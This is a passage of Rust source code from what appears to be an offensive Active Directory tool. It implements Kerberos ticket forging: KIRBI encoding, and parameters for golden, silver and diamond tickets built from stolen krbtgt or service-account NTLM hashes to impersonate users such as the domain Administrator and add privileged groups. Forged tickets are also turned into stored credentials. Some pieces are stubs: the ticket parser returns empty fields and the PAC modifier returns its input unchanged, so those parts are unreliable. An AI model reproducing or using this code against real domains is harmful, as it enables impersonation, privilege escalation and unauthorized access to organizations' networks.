        kirbi.extend_from_slice(ticket);

        let tickets_seq_len = kirbi.len() - tickets_seq_len_pos - 3;
        kirbi[tickets_seq_len_pos] = ((tickets_seq_len >> 8) & 0xff) as u8;
        kirbi[tickets_seq_len_pos + 1] = (tickets_seq_len & 0xff) as u8;

        let tickets_len = kirbi.len() - tickets_len_pos - 3;
        kirbi[tickets_len_pos] = ((tickets_len >> 8) & 0xff) as u8;
        kirbi[tickets_len_pos + 1] = (tickets_len & 0xff) as u8;

        // enc-part [3] EncryptedData
        kirbi.push(0xa3);
        let enc_len_pos = kirbi.len();
        kirbi.push(0x82);
        kirbi.extend_from_slice(&[0x00, 0x00]);

        kirbi.extend_from_slice(enc_part);

        let enc_len = kirbi.len() - enc_len_pos - 3;
        kirbi[enc_len_pos] = ((enc_len >> 8) & 0xff) as u8;
        kirbi[enc_len_pos + 1] = (enc_len & 0xff) as u8;

        let seq_len = kirbi.len() - seq_len_pos - 3;
        kirbi[seq_len_pos] = ((seq_len >> 8) & 0xff) as u8;
        kirbi[seq_len_pos + 1] = (seq_len & 0xff) as u8;

        let outer_len = kirbi.len() - outer_len_pos - 3;
        kirbi[outer_len_pos] = ((outer_len >> 8) & 0xff) as u8;
        kirbi[outer_len_pos + 1] = (outer_len & 0xff) as u8;

        Ok(kirbi)
    }

    fn parse_kirbi(&self, data: &[u8]) -> Result<ParsedTicket> {
        // Parse KIRBI format
        // Simplified parsing

        Ok(ParsedTicket {
            client_principal: String::new(),
            service_principal: String::new(),
            realm: String::new(),
            encryption_type: 23,
            start_time: Utc::now(),
            end_time: Utc::now(),
            renew_until: None,
            flags: 0,
            encrypted_part: data.to_vec(),
        })
    }

    fn modify_pac(&self, pac_data: &[u8], user: &str, rid: u32, groups: &[u32]) -> Result<Vec<u8>> {
        // Modify PAC to change user and groups
        // This would need to properly parse and rebuild the PAC
        Ok(pac_data.to_vec())
    }

    fn detect_ticket_type(&self, parsed: &ParsedTicket) -> TicketType {
        if parsed.service_principal.starts_with("krbtgt/") {
            TicketType::Golden
        } else {
            TicketType::Silver
        }
    }
}

// Parameter structures

#[derive(Debug, Clone)]
pub struct GoldenTicketParams {
    /// Target user to impersonate
    pub user: String,
    /// User RID (default: 500 for Administrator)
    pub user_rid: Option<u32>,
    /// Group RIDs to add
    pub groups: Vec<u32>,
    /// krbtgt NTLM hash
    pub krbtgt_hash: String,
    /// Encryption type (default: RC4)
    pub encryption_type: Option<i32>,
}

#[derive(Debug, Clone)]
pub struct SilverTicketParams {
    /// Target user to impersonate
    pub user: String,
    /// User RID
    pub user_rid: Option<u32>,
    /// Group RIDs
    pub groups: Vec<u32>,
    /// Service principal (e.g., "cifs/server.domain.com")
    pub service_principal: String,
    /// Service account NTLM hash
    pub service_hash: String,
    /// Encryption type
    pub encryption_type: Option<i32>,
}

#[derive(Debug, Clone)]
pub struct DiamondTicketParams {
    /// Original TGT (kirbi base64)
    pub original_tgt: Vec<u8>,
    /// Target user to escalate to
    pub target_user: String,
    /// Target user RID
    pub target_rid: Option<u32>,
    /// Groups to add
    pub groups: Vec<u32>,
    /// krbtgt hash for decryption/re-encryption
    pub krbtgt_hash: String,
}

// Result structures

#[derive(Debug, Clone)]
pub struct ForgedTicket {
    /// Ticket type
    pub ticket_type: TicketType,
    /// User the ticket is for
    pub user: String,
    /// Realm
    pub realm: String,
    /// Service principal
    pub service_principal: String,
    /// Start time
    pub start_time: DateTime<Utc>,
    /// End time
    pub end_time: DateTime<Utc>,
    /// Renew until
    pub renew_until: Option<DateTime<Utc>>,
    /// Encryption type
    pub encryption_type: i32,
    /// KIRBI format ticket data
    pub kirbi_data: Vec<u8>,
    /// ccache format (if converted)
    pub ccache_data: Option<Vec<u8>>,
    /// Additional metadata
    pub metadata: HashMap<String, String>,
}

impl ForgedTicket {
    /// Export as base64-encoded kirbi
    pub fn to_base64(&self) -> String {
        base64::encode(&self.kirbi_data)
    }

    /// Get ticket as stored credential
    pub fn to_credential(&self) -> StoredCredential {
        StoredCredential {
            id: String::new(),
            credential_type: match self.ticket_type {
                TicketType::Golden => CredentialType::KerberosTgt,
                _ => CredentialType::KerberosTgs,
            },
            identity: self.user.clone(),
            domain: Some(self.realm.clone()),
            secret: CredentialSecret::KerberosTicket {
                ticket_data: self.to_base64(),
                key_type: self.encryption_type,
            },
            source: CredentialSource::Manual,
            health: CredentialHealth::default(),
            targets: vec![self.service_principal.clone()],
            tags: vec![format!("{:?}", self.ticket_type).to_lowercase()],
            metadata: self.metadata.clone(),
            discovered_at: Utc::now(),
            last_verified_at: None,
            expires_at: Some(self.end_time),
            last_used_at: None,
        }
    }
}

#[derive(Debug, Clone, Copy)]
pub enum TicketType {
    Golden,
    Silver,
    Diamond,
}

#[derive(Debug, Clone)]
pub struct TicketInfo {
    pub ticket_type: TicketType,
    pub client_principal: String,
    pub service_principal: String,
    pub realm: String,
    pub encryption_type: i32,
    pub start_time: DateTime<Utc>,
    pub end_time: DateTime<Utc>,
    pub renew_until: Option<DateTime<Utc>>,
    pub flags: u32,
    pub is_valid: bool,
    pub pac_info: Option<PacInfo>,
}

#[derive(Debug, Clone)]
pub struct PacInfo {
    pub user_rid: u32,
    pub group_rids: Vec<u32>,
    pub domain_sid: String,
}

#[derive(Debug, Clone)]
struct ParsedTicket {
    client_principal: String,
    service_principal: String,
    realm: String,
    encryption_type: i32,
    start_time: DateTime<Utc>,
    end_time: DateTime<Utc>,
    renew_until: Option<DateTime<Utc>>,
    flags: u32,
    encrypted_part: Vec<u8>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ticket_forge_creation() {
        let config = TicketConfig {
            realm: "DOMAIN.COM".to_string(),
            domain_sid: "S-1-5-21-1234567890-1234567890-1234567890".to_string(),
            kdc: None,
        };

        let forge = TicketForge::new(config);
        assert_eq!(forge.config.realm, "DOMAIN.COM");
    }
}
